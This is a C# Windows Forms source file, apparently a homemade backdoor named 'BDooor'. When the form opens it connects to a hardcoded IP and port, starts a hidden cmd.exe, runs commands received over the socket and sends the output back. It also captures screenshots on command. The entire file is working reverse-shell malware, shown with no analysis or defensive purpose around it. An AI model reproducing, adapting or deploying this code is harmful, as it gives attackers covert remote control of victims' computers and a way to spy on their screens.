using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace BDooor
{

	public partial class Form1 : Form
	{
		public static string _ip = "192.168.0.25";
		public static int _po = 2522;

		public Form1()
        {
            InitializeComponent();

			StreamTCP();
        }

        public void do_ScreenShot()
        {
            Rectangle ScreenBounds = Screen.FromControl(this).Bounds;
            Bitmap captureBitmap = new Bitmap(ScreenBounds.Width, ScreenBounds.Height, PixelFormat.Format32bppArgb);
            Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
            Graphics captureGraphics = Graphics.FromImage(captureBitmap);
            captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
            captureBitmap.Save(Path.GetTempPath()+@"\Capture.jpg", ImageFormat.Jpeg);

        }



        //## netCat payload 2
		static StreamWriter streamWriter;
		public void StreamTCP()
		{
			using (TcpClient client = new TcpClient(_ip, _po)){
				using (Stream stream = client.GetStream()){
					using (StreamReader rdr = new StreamReader(stream)){
						streamWriter = new StreamWriter(stream);


						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputData);
						p.Start();
						p.BeginOutputReadLine();

						string tcpInput = "";
						while (true){
							tcpInput = rdr.ReadLine();//get tcp input

							p.StandardInput.WriteLine(LlTcpInput(tcpInput));//execute tcp input
							tcpInput = "";//clear previous strInput
						}
					}
				}
			}
		}
		//## netCat payload 1
		private static void CmdOutputData(object sendingProcess, DataReceivedEventArgs outLine){
			StringBuilder strOutput = new StringBuilder();

			if (!String.IsNullOrEmpty(outLine.Data)){
				try{
					streamWriter.WriteLine(outLine.Data);
					streamWriter.Flush();
				}catch (Exception err) { 
					MessageBox.Show(err.Message);
				}
			}
		}
		//## netCat payload 0

		public  string LlTcpInput(string wodr)
		{
			string cmdCommand = wodr;
			switch (wodr)
			{
				case "ls":
					cmdCommand = "dir";
					break;
				case "ls -Force":
					cmdCommand = "dir -Force";
					break;
				case "-screenshot":
					do_ScreenShot();
					cmdCommand = "echo \"screenshot captured..\"";
					break;
				case "??":
				case "-hep":
					cmdCommand = "echo \"[??|-hep] [ls] [-Screenshot]\"";
					break;
			}
			
			return cmdCommand;
		}
	}

}
